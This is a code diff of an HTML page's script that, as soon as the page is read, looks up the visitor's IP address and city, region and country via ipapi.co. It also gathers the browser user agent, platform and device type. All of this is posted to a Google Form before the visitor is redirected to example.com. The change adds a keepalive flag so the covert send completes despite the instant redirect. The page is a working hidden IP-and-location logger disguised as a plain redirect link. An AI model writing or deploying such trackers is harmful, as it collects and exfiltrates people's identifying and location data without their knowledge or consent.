@@ -7,48 +7,53 @@
         // Set the destination URL
         const REDIRECT_URL = "https://example.com";
 
-        // This function contains the logic
-        function initRedirectAndCapture() {
-            // Start sending data in the background
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(geoData => {
-                    const timestamp = new Date().toISOString();
-                    const userAgent = navigator.userAgent;
-                    const os = navigator.platform;
+        async function initRedirectAndCapture() {
+            try {
+                // 1. We MUST wait for the location data first. This is a necessary, small delay.
+                const geoResponse = await fetch('https://ipapi.co/json/');
+                const geoData = await geoResponse.json();
 
-                    let deviceInfo = 'Unknown';
-                    if (navigator.userAgentData) {
-                        const platform = navigator.userAgentData.platform;
-                        const isMobile = navigator.userAgentData.mobile ? 'Mobile' : 'Desktop';
-                        deviceInfo = `${platform} (${isMobile})`;
-                    } else {
-                        const isMobile = /Mobi/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-                        deviceInfo = `${navigator.platform} (${isMobile})`;
-                    }
+                // 2. Once we have the data, prepare it.
+                const timestamp = new Date().toISOString();
+                const userAgent = navigator.userAgent;
+                const os = navigator.platform;
 
-                    const formData = new FormData();
-                    formData.append("entry.1496883719", timestamp);
-                    formData.append("entry.1535774579", geoData.ip);
-                    formData.append("entry.2067837825", os);
-                    formData.append("entry.747657848", deviceInfo);
-                    formData.append("entry.1734202770", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
-                    formData.append("entry.448354724", userAgent);
+                let deviceInfo = 'Unknown';
+                if (navigator.userAgentData) {
+                    const platform = navigator.userAgentData.platform;
+                    const isMobile = navigator.userAgentData.mobile ? 'Mobile' : 'Desktop';
+                    deviceInfo = `${platform} (${isMobile})`;
+                } else {
+                    const isMobile = /Mobi/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                    deviceInfo = `${navigator.platform} (${isMobile})`;
+                }
 
-                    fetch("https://docs.google.com/forms/d/e/1FAIpQLSehg2hY3VPki5je6DE8lAmLPcXTGdk4ReZ7FCGxX_SZ3OJ0yg/formResponse", {
-                        method: "POST",
-                        body: formData,
-                        mode: "no-cors"
-                    });
-                })
-                .catch(err => console.error(err));
+                const formData = new FormData();
+                formData.append("entry.1496883719", timestamp);
+                formData.append("entry.1535774579", geoData.ip);
+                formData.append("entry.2067837825", os);
+                formData.append("entry.747657848", deviceInfo);
+                formData.append("entry.1734202770", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
+                formData.append("entry.448354724", userAgent);
 
-            // Redirect the user immediately
-            window.location.href = REDIRECT_URL;
+                // 3. Send the data with the 'keepalive' flag.
+                // The script does NOT wait for this to finish.
+                fetch("https://docs.google.com/forms/d/e/1FAIpQLSehg2hY3VPki5je6DE8lAmLPcXTGdk4ReZ7FCGxX_SZ3OJ0yg/formResponse", {
+                    method: "POST",
+                    body: formData,
+                    mode: "no-cors",
+                    keepalive: true // This is the key change!
+                });
+
+            } catch (err) {
+                console.error(err);
+            } finally {
+                // 4. Redirect immediately after the data send has been initiated.
+                window.location.href = REDIRECT_URL;
+            }
         }
 
-        // --- NEW: Call the function immediately ---
-        // This runs as soon as the script is read by the browser, instead of waiting for the page to load.
+        // Call the function to start the process.
         initRedirectAndCapture();
     </script>
 </head>
